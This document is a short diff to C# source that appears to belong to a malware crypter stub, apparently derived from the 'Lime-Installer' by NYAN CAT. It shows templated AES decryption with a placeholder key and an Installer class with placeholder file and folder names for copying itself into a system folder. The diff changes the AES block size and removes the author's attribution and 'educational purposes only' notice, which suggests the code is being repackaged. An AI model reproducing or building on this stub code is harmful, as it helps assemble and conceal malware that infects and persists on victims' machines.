@@ -44,7 +44,7 @@ namespace Stub
                 using (RijndaelManaged AES = new RijndaelManaged())
                 {
                     AES.KeySize = 256;
-                    AES.BlockSize = 128;
+                    AES.BlockSize = 256;
                     var passwordBytes = Encoding.UTF8.GetBytes("#AesKey");
                     var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                     AES.Key = key.GetBytes(AES.KeySize / 8);
@@ -66,15 +66,6 @@ namespace Stub
     #region Installation
     public class Installer
     {
-
-        /*
-         * │ Author       : NYAN CAT
-         * │ Name         : Lime-Installer | Basic version
-         * │ Contact      : https:github.com/NYAN-x-CAT
-         * 
-         * This program is distributed for educational purposes only.
-         */
-
         public bool EnableInstall { get; set; }
         public FileInfo FileName = new FileInfo("#FileName");
         public DirectoryInfo DirectoryName = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.@FolderName), "#SecondFolder"));
